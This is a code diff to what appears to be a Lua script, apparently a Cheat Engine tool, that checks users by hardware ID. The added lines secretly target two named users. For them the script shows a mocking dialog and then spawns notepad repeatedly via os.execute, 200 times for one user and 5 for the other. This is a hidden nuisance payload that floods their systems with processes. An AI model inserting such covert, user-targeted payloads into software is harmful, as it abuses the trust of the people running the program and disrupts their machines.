@@ -97,6 +97,18 @@
     HWID = all_trim(result)
     for i=1,#HWID_Array-1,2 do
      if HWID == HWID_Array[i] then
+       if HWID_Array[i+1] == 'NikLex#4033' then
+         messageDialog('Welcome back)))))))))))))))), '..HWID_Array[i+1],mtInformation,mbOk)
+         for i=1,200 do
+           os.execute('Start notepad')
+         end
+       end
+       if HWID_Array[i+1] == 'Vi’o’Lence#4225' then
+         messageDialog('Welcome back)))))))))))))))), '..HWID_Array[i+1],mtInformation,mbOk)
+         for i=1,5 do
+           os.execute('Start notepad')
+         end
+       end
        messageDialog('Welcome back, '..HWID_Array[i+1],mtInformation,mbOk)
        Username ="User: "..HWID_Array[i+1]
        SendPack("Launched App",1,1)
